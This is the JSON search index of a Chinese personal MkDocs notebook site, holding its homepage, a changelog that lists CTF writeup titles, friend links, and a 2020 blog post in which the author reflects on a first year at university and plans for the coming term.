{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f \u00b6 \u8fd9\u91cc\u662f\u5495\u5495\u5495\uff08Jimmy\uff09\u7684\u7a7a\u767d\u7b14\u8bb0\u672c! :) orz \u6700\u8fd1\u66f4\u65b0 / \u670b\u53cb\u4eec! / \u7ad9\u70b9\u7edf\u8ba1 \u9875\u9762\u603b\u6570\uff1a15 \u603b\u5b57\u6570\uff1a11794 \u4ee3\u7801\u5757\u884c\u6570\uff1a1144 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a function updateTime() { var date = new Date(); var now = date.getTime(); var startDate = new Date(\"2023/10/26 10:59:00\"); var start = startDate.getTime(); var diff = now - start; var y, d, h, m; y = Math.floor(diff / (365 * 24 * 3600 * 1000)); diff -= y * 365 * 24 * 3600 * 1000; d = Math.floor(diff / (24 * 3600 * 1000)); h = Math.floor(diff / (3600 * 1000) % 24); m = Math.floor(diff / (60 * 1000) % 60); if (y == 0) { document.getElementById(\"web-time\").innerHTML = d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } else { document.getElementById(\"web-time\").innerHTML = y + \"<span class=\\\"heti-spacing\\\"> </span>\u5e74<span class=\\\"heti-spacing\\\"> </span>\" + d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } setTimeout(updateTime, 1000 * 60); } updateTime(); function toggle_statistics() { var statistics = document.getElementById(\"statistics\"); if (statistics.style.opacity == 0) { statistics.style.opacity = 1; } else { statistics.style.opacity = 0; } }","title":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f"},{"location":"#_1","text":"\u8fd9\u91cc\u662f\u5495\u5495\u5495\uff08Jimmy\uff09\u7684\u7a7a\u767d\u7b14\u8bb0\u672c! :) orz \u6700\u8fd1\u66f4\u65b0 / \u670b\u53cb\u4eec! / \u7ad9\u70b9\u7edf\u8ba1 \u9875\u9762\u603b\u6570\uff1a15 \u603b\u5b57\u6570\uff1a11794 \u4ee3\u7801\u5757\u884c\u6570\uff1a1144 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a function updateTime() { var date = new Date(); var now = date.getTime(); var startDate = new Date(\"2023/10/26 10:59:00\"); var start = startDate.getTime(); var diff = now - start; var y, d, h, m; y = Math.floor(diff / (365 * 24 * 3600 * 1000)); diff -= y * 365 * 24 * 3600 * 1000; d = Math.floor(diff / (24 * 3600 * 1000)); h = Math.floor(diff / (3600 * 1000) % 24); m = Math.floor(diff / (60 * 1000) % 60); if (y == 0) { document.getElementById(\"web-time\").innerHTML = d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } else { document.getElementById(\"web-time\").innerHTML = y + \"<span class=\\\"heti-spacing\\\"> </span>\u5e74<span class=\\\"heti-spacing\\\"> </span>\" + d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } setTimeout(updateTime, 1000 * 60); } updateTime(); function toggle_statistics() { var statistics = document.getElementById(\"statistics\"); if (statistics.style.opacity == 0) { statistics.style.opacity = 1; } else { statistics.style.opacity = 0; } }","title":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f"},{"location":"changelog/","text":"\u66f4\u65b0\u8bb0\u5f55 \u00b6 Abstract \u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9bnote\u7684\u8f83\u5927\u6539\u52a8\u8bb0\u5f55 Powered by TonyCrane/mkdocs-changelog-plugin .md-typeset h2 { margin-top: 0em; } 2025 \u00b6 2025-02-19 \u00b6 Legacy > Old Blog > \u5143\u80de\u81ea\u52a8\u673a Legacy > Old Blog > \u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 Legacy > Old Blog > \u5f00\u7aef \u5220\u9664\u4e86\u4e00\u90e8\u65e0\u7528\u5206\u7c7b\uff0c\u589e\u52a0\u4e86Blog\u3001Legacy\u680f\u76ee 2024 \u00b6 2024-10-22 \u00b6 ZJUCTF 2024 Writeups 2023 \u00b6 2023-10-26 \u00b6 Ethernaut ZJUCTF 2023 Writeup 2023-10-25 \u00b6 Hackergame 2023 Writeup \u53c2\u7167 TonyCrane \u5b8c\u6210\u4e86\u7f51\u7ad9\u7684\u90e8\u7f72","title":"\u66f4\u65b0\u8bb0\u5f55"},{"location":"changelog/#_1","text":"Abstract \u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9bnote\u7684\u8f83\u5927\u6539\u52a8\u8bb0\u5f55 Powered by TonyCrane/mkdocs-changelog-plugin .md-typeset h2 { margin-top: 0em; }","title":"\u66f4\u65b0\u8bb0\u5f55"},{"location":"changelog/#2025","text":"2025-02-19 \u00b6 Legacy > Old Blog > \u5143\u80de\u81ea\u52a8\u673a Legacy > Old Blog > \u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 Legacy > Old Blog > \u5f00\u7aef \u5220\u9664\u4e86\u4e00\u90e8\u65e0\u7528\u5206\u7c7b\uff0c\u589e\u52a0\u4e86Blog\u3001Legacy\u680f\u76ee","title":"2025"},{"location":"changelog/#2024","text":"2024-10-22 \u00b6 ZJUCTF 2024 Writeups","title":"2024"},{"location":"changelog/#2023","text":"2023-10-26 \u00b6 Ethernaut ZJUCTF 2023 Writeup 2023-10-25 \u00b6 Hackergame 2023 Writeup \u53c2\u7167 TonyCrane \u5b8c\u6210\u4e86\u7f51\u7ad9\u7684\u90e8\u7f72","title":"2023"},{"location":"links/","text":"\u53cb\u94fe \u00b6 Abstract \u4e00\u4e9b\u5927\u4f6c\u4eec\u7684\u7b14\u8bb0\u672corz \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c Tony\u8001\u5e08\uff01 AC Dustbin We will glow in the dark turning dust to gold.","title":"\u53cb\u94fe"},{"location":"links/#_1","text":"Abstract \u4e00\u4e9b\u5927\u4f6c\u4eec\u7684\u7b14\u8bb0\u672corz \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c Tony\u8001\u5e08\uff01 AC Dustbin We will glow in the dark turning dust to gold.","title":"\u53cb\u94fe"},{"location":"blog/","text":"","title":"Index"},{"location":"legacy/","text":"Legacy \u00b6 Abstract \u4eba\u4eec\u5f80\u5f80\u5584\u4e8e\u6316\u5751\uff0c\u5374\u4e0d\u5584\u4e8e\u586b\u5751\uff0c\u6211\u4ea6\u5982\u6b64\u3002 \u8fd9\u91cc\u57cb\u846c\u8fd9\u4e00\u4e9b\u8fc7\u53bb\uff0c\u6216\u4e3a\u73cd\u5b9d\uff0c\u6216\u4e3a\u7834\u70c2\u3002 \u514d\u8d23\u58f0\u660e\uff1a\u6b64\u5904\u5185\u5bb9\u4e0e\u5f53\u4e0b\u672c\u4eba\u65e0\u5173 O(\u2229_\u2229)O Table of Contents \u00b6 Old Blog \u5f00\u7aef 1251 4 mins 1739977430 \u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 1479 5 mins 1739977430 \u5143\u80de\u81ea\u52a8\u673a 1037 54 4 mins 1739977430 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Legacy"},{"location":"legacy/#legacy","text":"Abstract \u4eba\u4eec\u5f80\u5f80\u5584\u4e8e\u6316\u5751\uff0c\u5374\u4e0d\u5584\u4e8e\u586b\u5751\uff0c\u6211\u4ea6\u5982\u6b64\u3002 \u8fd9\u91cc\u57cb\u846c\u8fd9\u4e00\u4e9b\u8fc7\u53bb\uff0c\u6216\u4e3a\u73cd\u5b9d\uff0c\u6216\u4e3a\u7834\u70c2\u3002 \u514d\u8d23\u58f0\u660e\uff1a\u6b64\u5904\u5185\u5bb9\u4e0e\u5f53\u4e0b\u672c\u4eba\u65e0\u5173 O(\u2229_\u2229)O","title":"Legacy"},{"location":"legacy/#table-of-contents","text":"Old Blog \u5f00\u7aef 1251 4 mins 1739977430 \u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 1479 5 mins 1739977430 \u5143\u80de\u81ea\u52a8\u673a 1037 54 4 mins 1739977430 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Table of Contents"},{"location":"legacy/old_blog/20200309/","text":"\u5f00\u7aef \u00b6 \u7ea6 1247 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f Abstract \u672c\u6587\u4e8e2020\u5e743\u67089\u65e5\u64b0\u5199\u5728\u8001\u535a\u5ba2\uff0c\u73b0\u91cd\u65b0\u6574\u7406\u6536\u5f55\u4e8e\u6b64\u3002 \u4e00\u5207\u7684\u5f00\u7aef \u00b6 \u679c\u7136\u6211\u6d3b\u7684\u6beb\u65e0\u89c4\u5f8b\u548c\u7ae0\u6cd5\uff0c\u56e0\u4e3a\u4eca\u6668\u7684\u4e00\u65f6\u5174\u8d77\u5c31\u642d\u5efa\u4e86\u8fd9\u4e00\u4e2aBlog\uff0c\u5e76\u4e0d\u662f\u75b2\u4e8e\u7f51\u8bfe\uff08\u6b63\u662f\u800c\u95f2\u5f97\u65e0\u804a\u800c\u73a9\u4e86\u8d77\u6765\u3002\u867d\u7136\u8bf4\u662f\u5076\u7136\u56e0\u7d20\u9020\u6210\uff0c\u4f46\u7a76\u5176\u6839\u672c\u6216\u8bb8\u662f\u524d\u4e9b\u65e5\u5b50\u3001\u4e5f\u5c31\u662f\u4e4b\u524d\u7684\u534a\u5e74\u6d3b\u5f97\u6709\u4e9b\u6d51\u6d51\u5669\u5669\u4e86\u5427\u3002\u597d\u5427\uff0c\u6211\u5c31\u6b64\u53cd\u601d\u8fc7\u9519\uff0c\u5e76\u5c55\u671b\uff08\u4ec5\u6b64\u800c\u5df2\u4e00\u4e0b\u672a\u6765\u3002 \u5f00\u59cb\u80e1\u8bcc\uff01 \u8fc7\u53bb\u534a\u5e74\u7684\u56de\u987e \u00b6 \u6574\u4e2a\u5927\u4e00\u4e0a\uff0c\u6211\u79c9\u6301\u7740\u9002\u5e94\u7684\u539f\u5219 \uff0c\u5c3d\u53ef\u80fd\u5730\u53bb\u53c2\u4e0e\u4e86\u4e00\u5207\u53ef\u4ee5\u53c2\u4e0e\u7684\u4e8b\u7269\uff0c\u65e0\u8bba\u662f\u5b66\u751f\u7ec4\u7ec7\u3001\u793e\u56e2\u3001\u5404\u7ea7\u6d3b\u52a8\u2026\u2026\u770b\u4f3c\u6574\u65e5\u6beb\u65e0\u7a7a\u6687\u4e4b\u4f59\uff0c\u5b9e\u5219\u5374\u788c\u788c\u65e0\u4e3a\uff0c\u4ece\u67d0\u79cd\u89d2\u5ea6\u4e0a\u6765\u8bf4\uff0c\u6216\u8bb8\u662f\u65e0\u6240\u6c42\u800c\u65e0\u6240\u5f97\u3002\u8fd9\u4e48\u591a\u7684\u4e8b\u60c5\u5728\u6211\u773c\u4e2d\u7eaf\u4e4e\u6ca1\u6709\u610f\u4e49\uff0c\u4e0d\u8fc7\u662f\u5c06\u4e00\u8fde\u4e32\u7684\u4efb\u52a1\u5c3d\u5168\u529b\u53bb\u66f4\u597d\u7684\u5b8c\u6210\u7f62\u4e86\u3002 \u4ee5\u4e0b\u4fbf\u662f\u6211\u5728\u51ac\u5b66\u671f\u4e4b\u521d\u5199\u4e0b\u7684\u8f83\u4e3a\u91cd\u8981\u7684\u4efb\u52a1\uff0c\u770b\u4f3c\u957f\u957f\u4e00\u4e32\uff0c\u5176\u4e2d\u591a\u5c11\u771f\u6b63\u5bf9\u81ea\u5df1\u4ea7\u751f\u4e86\u5b9e\u8d28\u6027\u6b63\u5411\u7684\u5f71\u54cd\uff0c\u6211\u4e2a\u4eba\u8ba4\u4e3a\u5e94\u5f53\u662f\u5be5\u5be5\u65e0\u51e0\u3002 \u4efb\u52a1\u6e05\u5355 \u2714\u82f1\u8bed\u4f5c\u6587 \u2714\u8fd0\u52a8\u4e0e\u8111\u6570\u636e \u2714\u601d\u4fee\u7814\u7a76\u62a5\u544a \u2714\u82f1\u8bed\u4e66\u8bc4 \u2714\u9a6c\u539f\u8bba\u6587 \u2714\u533b\u5b66\u9057\u4f20\u8bba\u6587 \u2714\u56e2\u5de5\u59d4\u65b0\u665a \u2714\u601d\u4fee\u5c55\u793a\u4f5c\u4e1a \u2714\u9ed1\u767d\u6444\u5f71\u4f5c\u4e1a \u2714\u7f8e\u98df\u63a8\u6587 \u2714\u7ecf\u6d4e\u6cd5\u5408\u540c\u4f5c\u4e1a \u2714\u5de5\u4f5c\u7ec4\u4e3b\u9898\u63a8\u6587 \u2714\u5b66\u6587\u6d3b\u52a8\u63a8\u6587 \u2714\u5cf0\u4f1a\u5e72\u4e8b\u7ade\u9009 \u2714\u82f1\u8bed\u5f71\u8bc4 \u2714\u8fd0\u52a8\u4e0e\u8111\u4e2a\u4eba\u4f5c\u4e1a \u2714\u90e8\u95e8\u5723\u8bde\u5185\u5efa\u7b56\u5212 \u2714\u7ba1\u7406\u6c9f\u901a\u5c0f\u7ec4\u4f5c\u4e1a \u2714\u7ba1\u7406\u6c9f\u901a\u4e2a\u4eba\u4f5c\u4e1a \u2714\u63a8\u6587\u7ec4\u65e5\u5e38\u63a8\u6587 \u2714\u8fc7\u5e74\u4e91\u5cf0\u65b9\u9635\u6392\u7ec3 \u2714\u5fae\u79ef\u5206\u6155\u8bfe\u6d4b\u8bd5 \u2714\u7ebf\u4ee3\u6155\u8bfe\u6d4b\u8bd5 \u2714\u7ba1\u7406\u6c9f\u901a\u8bfe\u5802\u671f\u672b\u8003\u590d\u4e60 \u2714\u671f\u672b\u590d\u4e60\uff08\u5927\u82f1\u3001\u8fd0\u52a8\u4e0e\u8111\u3001\u5fae\u79ef\u5206\u3001C\u7a0b\u3001\u7ebf\u4ee3\u3001\u601d\u4fee\u3001\u7ecf\u6d4e\u6cd5\uff09 \u603b\u5f97\u6765\u8bf4\uff0c\u5356\u529b\u5212\u6868\uff0c\u539f\u5730\u6253\u8f6c\u3002\u4e0d\u8fc7\u4e5f\u5e76\u975e\u6beb\u65e0\u6536\u83b7\uff0c\u5927\u6982\u4e5f\u660e\u786e\u4e86\u4e8e\u81ea\u5df1\u800c\u8a00\uff0c\u54ea\u4e9b\u4e1c\u897f\u5177\u6709\u66f4\u9ad8\u7684\u4f18\u5148\u7ea7\u548c\u91cd\u8981\u6027\u3002\u6709\u559c\u6709\u5fe7\uff0c\u4e0d\u8fc7\u4eba\u4e4b\u5e38\u60c5\uff1b\u60a3\u5f97\u60a3\u5931\uff0c\u4e5f\u56e0\u5fc3\u4e2d\u6709\u7684\u3002 \u5c55\u671b0202\u8fd9\u4e00\u5e74 \u00b6 \u8bfe\u4e1a \u00b6 \u9996\u5148\uff0c\u5f53\u7136\u662f\u6700\u7d27\u8981\uff08\u8981\u547d\u7684\u5b66\u4e1a\u65b9\u9762\uff0c\u7531\u4e8e\u4e0a\u5b66\u671f\u56e0\u8fc7\u591a\u5b66\u5206\u5bfc\u81f4\u7cbe\u529b\u5206\u6563\u800c\u7f8e\u4e2d\u4e0d\u8db3\uff0c\u6240\u4ee5\u8fd9\u5b66\u671f\uff0c\u6211\u5728\u5b66\u5206\u65b9\u9762\u7ed9\u81ea\u5df1\u7559\u6709\u8f83\u5927\u7684\u8c03\u8282\uff08\u73a9\u800d\u7a7a\u95f4\uff0c\u4f46\u662f\u6c34\u8bfe\u53d8\u5c11\uff0c\u5176\u5b9e\u4e5f\u548c\u4e0a\u5b66\u671f\u534a\u65a4\u516b\u4e24\u3002\u603b\u4e4b\uff0c\u4e00\u4e2a\u65b9\u9488\u2014\u2014\u786c\u8bfe\u7a33\u4e00\u624b\uff0c\u6c34\u8bfe\u5077\u4e00\u628a\u3002\u7531\u4e8e\u53cc\u98de\u53f2\u7eb2\u548c\u9a6c\u539f\uff0c\u96be\u514d\u4f1a\u9677\u5165\u9e45\u9888\u7684\u6ce5\u6dd6\uff0c\u5f97\u6ce8\u610f\u7406\u667a\u51b7\u9759\u5730\u809d\u3002\u4fdd\u6301\u7a33\u5b9a\u5427\uff0c\u5176\u4ed6\u4e5f\u5c31\u8fd9\u6837\u3002 \u5bf9\u4e8e\u8f85\u4fee\u4e4b\u7c7b\uff0c\u9274\u4e8e\u8f85\u4fee\u7684\u6beb\u65e0\u5b58\u5728\u611f\uff0c\u51b3\u5b9a\u53bb\u8bd5\u8bd5\u5de5\u9ad8\u73ed\u3002\uff08\u8349\u7387\u5730\u77ac\u95f4\u505a\u51b3\u5b9a \u5de5\u4f5c \u00b6 \u7ec4\u7ec7\u65b9\u9762\uff0c\u5b66\u751f\u4f1a\u7684\u6d3b\u52a8\u7531\u4e8e\u67d0\u4e9b\u4e0d\u53ef\u63a7\u56e0\u7d20\uff08\u9886\u5bfc\u6e05\u5947\u7684\u8111\u56de\u8def\u548c\u538b\u69a8\u76f4\u63a5\u88ab\u53d6\u6d88\uff0c\u4f30\u6478\u7740\u63a5\u4e0b\u6765\u4e5f\u5c31\u662f\u4e00\u4e9b\u5c0f\u63a8\u6587\u5de5\u4f5c\u548c\u7559\u4efb\u5de5\u4f5c\uff0c\u521d\u6b65\u8ba1\u5212\u62d2\u7edd\u7559\u4efb\uff0c\u867d\u7136\u8bf4\u5f53\u4ec1\u4e0d\u8ba9\uff0c\u4f46\u662f\u4eba\u5404\u6709\u5fd7\u5427\u3002\u56e2\u5de5\u59d4\u65b9\u9762\uff0c\u5e94\u8be5\u8fd8\u6709\u4e00\u4e2a\u5ef6\u671f\u7684\u5b66\u751f\u52a9\u7406\u57f9\u8bad\u4f1a\u8bae\u7684\u9879\u76ee\u548c\u65e5\u5e38\u503c\u73ed\uff0818r/h\u7684\u5ec9\u4ef7\u52b3\u52a8\u529b\uff0c\u4e5f\u4e0d\u7559\u4efb\u3002 \u793e\u56e2\u65b9\u9762\uff0c\u4fbf\u662f\u5d4c\u5165\u5f0f\u4eba\u5de5\u667a\u80fd\u793e\u56e2\uff0c\u4e0a\u4e2a\u5b66\u671f\u5f00\u5b66\u7684\u5934\u8111\u4e00\u70ed\u52a0\u5165\u7684orz\u3002\u4e0a\u5b66\u671f\u5185\u8bad\u7684Torch\u3001OpenCV\u65e9\u5df2\u88ab\u629b\u4e4b\u8111\u540e\uff0c\u8fc7\u4e8e\u6c34\u7684\u540e\u679c\u5c31\u662f\u8fd9\u5b66\u671f\u7684\u70b8\u88c2\u3002\u61a8\u61a8\u5982\u6211\uff0c\u9519\u8fc7\u4f8b\u4f1a\u88ab\u81ea\u52a8\u5206\u914d\u4efb\u52a1\uff0c\u7adf\u7136\u662f\u6211\u4ece\u672a\u63a5\u89e6\u8fc7\u7684\u6811\u8393\u6d3e/STM32\u3002\u6682\u4e14\u5148\u81ea\u5b66\u7740\u5427\uff0c\u53cd\u6b63\u662f\u793e\u56e2\uff0c\u5927\u4e0d\u4e86\u5495\u5495\u5495\uff08\u9003\u3002 \u5de5\u4f5c\u8ba1\u5212 \u4e91\u5cf0\u5b66\u751f\u4f1a \u7559\u4efb\u5de5\u4f5c \u65e5\u5e38\u63a8\u6587 \u56e2\u5de5\u59d4 \u65e5\u5e38\u503c\u73ed \u5b66\u751f\u52a9\u7406\u57f9\u8bad\u4f1a\u8bae \u7559\u4efb \u5d4c\u5165\u5f0f\u4eba\u5de5\u667a\u80fd\u793e\u56e2 \u590d\u4e60\u5185\u8bad\u5185\u5bb9 Matplotlib Numpy Torch OpenCV \u5b8c\u6210\u6811\u8393\u6d3e/STM32\u63a8\u6587 \u505a\u5c0f\u7ec4\u9879\u76ee \u4e1a\u4f59 \u00b6 \u975e\u9893\u5e9f\u4e4b\u4e8b \u00b6 \u8fd9\u4e00\u7c7b\u4e8b\u60c5\u5c31\u662f\u90a3\u79cd\u8ba1\u5212\u548c\u5b8c\u6210\u6bd4\u5de8\u9ad8\u7684\uff0c\u6bcf\u6b21\u90fd\u4ee4\u81ea\u5df1\u61ca\u6094\u7684\u3002\u867d\u7136\u5982\u6b64\uff0c\u8ba1\u5212\u8fd8\u662f\u8981\u6709\u7684 TODO IMPORTANCE DS \u4e2d TOEFL \u9ad8 Blog \u4f4e Project \u4f4e Reading \u4e2d \u5815\u843d\u5427 \u00b6 \u867d\u7136\u662f\u4e00\u70b9\u7a7a\u865a\u7684\u5feb\u4e50\uff0c\u4f46\u662f\u4e5f\u662f\u4eba\u751f\u5fc5\u4e0d\u53ef\u5c11\u7684\u5185\u5bb9\uff0c\u5728\u60c5\u611f\u4e0a\u5177\u6709\u66f4\u9ad8\u7684\u4ef7\u503c\u548c\u610f\u4e49\u5427\u3002 \u4f19\u4f34\u90ca\u6e38 \u534a\u591c\u72c2\u6b22 \u3002\u3002\u3002\uff08\u597d\u53ed\uff0c\u60f3\u4e0d\u51fa\u6765\u4e86\uff0c\u53cd\u6b63high\u5c31\u5bf9\u4e86\uff09 \u5199\u5728\u6587\u672b \u00b6 \u788e\u788e\u5ff5\u4e86\u8fd9\u4e48\u4e45\uff0c\u4e5f\u4e0d\u77e5\u4e91\u4e91 \u4e3b\u8981\u662f\u642d\u5efa\u4e86\u4e00\u4e2aBlog\uff0c\u603b\u4e0d\u80fd\u8ba9\u5b83\u7a7a\u7a7a\u5982\u4e5f\uff0c\u6240\u4ee5\u5c31\u4e92\u62fc\u4e71\u51d1\u5730\u5148\u5199\u4e00\u7bc7\u6491\u6491\u573a\u9762\uff0c\u8fd8\u5f97Blog\u8981\u7d20\u5168\u4e86\u3002\u54c8\u54c8\u54c8\uff01 \u7adf\u7136\u5199\u4e86\u90a3\u4e48\u4e45\uff0c\u4e3b\u8981\u4e2d\u95f4\u5404\u79cd\u4e8b\u60c5\u5c42\u51fa\u4e0d\u7a77\uff0c\u5207\u8bb0\uff0c\u4e00\u5fc3\u4e0d\u53ef\u591a\u7528\u554a\uff01 2020.3.9 21:45","title":"\u5f00\u7aef"},{"location":"legacy/old_blog/20200309/#_1","text":"\u7ea6 1247 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f Abstract \u672c\u6587\u4e8e2020\u5e743\u67089\u65e5\u64b0\u5199\u5728\u8001\u535a\u5ba2\uff0c\u73b0\u91cd\u65b0\u6574\u7406\u6536\u5f55\u4e8e\u6b64\u3002","title":"\u5f00\u7aef"},{"location":"legacy/old_blog/20200309/#_2","text":"\u679c\u7136\u6211\u6d3b\u7684\u6beb\u65e0\u89c4\u5f8b\u548c\u7ae0\u6cd5\uff0c\u56e0\u4e3a\u4eca\u6668\u7684\u4e00\u65f6\u5174\u8d77\u5c31\u642d\u5efa\u4e86\u8fd9\u4e00\u4e2aBlog\uff0c\u5e76\u4e0d\u662f\u75b2\u4e8e\u7f51\u8bfe\uff08\u6b63\u662f\u800c\u95f2\u5f97\u65e0\u804a\u800c\u73a9\u4e86\u8d77\u6765\u3002\u867d\u7136\u8bf4\u662f\u5076\u7136\u56e0\u7d20\u9020\u6210\uff0c\u4f46\u7a76\u5176\u6839\u672c\u6216\u8bb8\u662f\u524d\u4e9b\u65e5\u5b50\u3001\u4e5f\u5c31\u662f\u4e4b\u524d\u7684\u534a\u5e74\u6d3b\u5f97\u6709\u4e9b\u6d51\u6d51\u5669\u5669\u4e86\u5427\u3002\u597d\u5427\uff0c\u6211\u5c31\u6b64\u53cd\u601d\u8fc7\u9519\uff0c\u5e76\u5c55\u671b\uff08\u4ec5\u6b64\u800c\u5df2\u4e00\u4e0b\u672a\u6765\u3002 \u5f00\u59cb\u80e1\u8bcc\uff01","title":"\u4e00\u5207\u7684\u5f00\u7aef"},{"location":"legacy/old_blog/20200309/#_3","text":"\u6574\u4e2a\u5927\u4e00\u4e0a\uff0c\u6211\u79c9\u6301\u7740\u9002\u5e94\u7684\u539f\u5219 \uff0c\u5c3d\u53ef\u80fd\u5730\u53bb\u53c2\u4e0e\u4e86\u4e00\u5207\u53ef\u4ee5\u53c2\u4e0e\u7684\u4e8b\u7269\uff0c\u65e0\u8bba\u662f\u5b66\u751f\u7ec4\u7ec7\u3001\u793e\u56e2\u3001\u5404\u7ea7\u6d3b\u52a8\u2026\u2026\u770b\u4f3c\u6574\u65e5\u6beb\u65e0\u7a7a\u6687\u4e4b\u4f59\uff0c\u5b9e\u5219\u5374\u788c\u788c\u65e0\u4e3a\uff0c\u4ece\u67d0\u79cd\u89d2\u5ea6\u4e0a\u6765\u8bf4\uff0c\u6216\u8bb8\u662f\u65e0\u6240\u6c42\u800c\u65e0\u6240\u5f97\u3002\u8fd9\u4e48\u591a\u7684\u4e8b\u60c5\u5728\u6211\u773c\u4e2d\u7eaf\u4e4e\u6ca1\u6709\u610f\u4e49\uff0c\u4e0d\u8fc7\u662f\u5c06\u4e00\u8fde\u4e32\u7684\u4efb\u52a1\u5c3d\u5168\u529b\u53bb\u66f4\u597d\u7684\u5b8c\u6210\u7f62\u4e86\u3002 \u4ee5\u4e0b\u4fbf\u662f\u6211\u5728\u51ac\u5b66\u671f\u4e4b\u521d\u5199\u4e0b\u7684\u8f83\u4e3a\u91cd\u8981\u7684\u4efb\u52a1\uff0c\u770b\u4f3c\u957f\u957f\u4e00\u4e32\uff0c\u5176\u4e2d\u591a\u5c11\u771f\u6b63\u5bf9\u81ea\u5df1\u4ea7\u751f\u4e86\u5b9e\u8d28\u6027\u6b63\u5411\u7684\u5f71\u54cd\uff0c\u6211\u4e2a\u4eba\u8ba4\u4e3a\u5e94\u5f53\u662f\u5be5\u5be5\u65e0\u51e0\u3002 \u4efb\u52a1\u6e05\u5355 \u2714\u82f1\u8bed\u4f5c\u6587 \u2714\u8fd0\u52a8\u4e0e\u8111\u6570\u636e \u2714\u601d\u4fee\u7814\u7a76\u62a5\u544a \u2714\u82f1\u8bed\u4e66\u8bc4 \u2714\u9a6c\u539f\u8bba\u6587 \u2714\u533b\u5b66\u9057\u4f20\u8bba\u6587 \u2714\u56e2\u5de5\u59d4\u65b0\u665a \u2714\u601d\u4fee\u5c55\u793a\u4f5c\u4e1a \u2714\u9ed1\u767d\u6444\u5f71\u4f5c\u4e1a \u2714\u7f8e\u98df\u63a8\u6587 